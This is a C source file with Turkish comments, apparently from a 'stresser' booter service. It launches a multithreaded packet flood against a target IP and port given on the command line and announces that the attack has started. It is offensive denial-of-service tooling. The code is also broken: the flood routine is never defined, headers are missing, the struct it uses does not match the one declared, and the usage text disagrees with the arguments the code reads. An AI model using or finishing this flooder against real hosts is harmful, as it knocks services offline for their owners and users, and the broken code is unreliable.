//bu script cok güclü scripttir mr.hasan tarafından kodlanmistir
//benim yaptiklarımla bana gelip artislenmeyin
//herkesin neyin ne oldugunu cok iyi bilir.
//hasanatilan.com

#include <time.h>
#include <arpa/inet.h>

 
#define MAX_PAKET_BOYUTU 4096
#define PHI 0x9e3779b9
 


struct paket_verisi{
        int pks;
        int hassiktir;
	int paket_numarasi;
	unsigned int saldiriport;
	struct sockaddr_in sin;
};
 

int main(int argc, char *argv[ ])
{
  if(argc < 6){
    fprintf(stderr, "www.stresser.me MR.HASAN!\n");
    fprintf(stdout, "Stresser.Me Team\n Kullanim: %s <İP> <PORT> <KULLANILCAK İŞLEMCİ>\n", argv[0]);
    exit(-1);
  }

  fprintf(stdout, "Soketler Ayarlaniyor...\n");

  int çekirdek = atoi(argv[5]);
  int paket_boyutu = atoi(argv[4]);
  unsigned int saldiriport = atoi(argv[2]);
  pthread_t paket[çekirdek];
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(saldiriport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);

  struct thread_data td[çekirdek];

  int i;
  for(i = 0;i<çekirdek;i++){
    td[i].paket_numarasi = i;
    td[i].pks = paket_boyutu;
    td[i].sin = sin;
    td[i].saldiriport = saldiriport;
    td[i].hassiktir = atoi(argv[3]);
    pthread_create( &paket[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "Saldiri Basladi...\n");
  if(argc > 6)
  {
    sleep(atoi(argv[6]));
  } else {
    while(1){
      sleep(1);
    }
  }

  return 0;
}
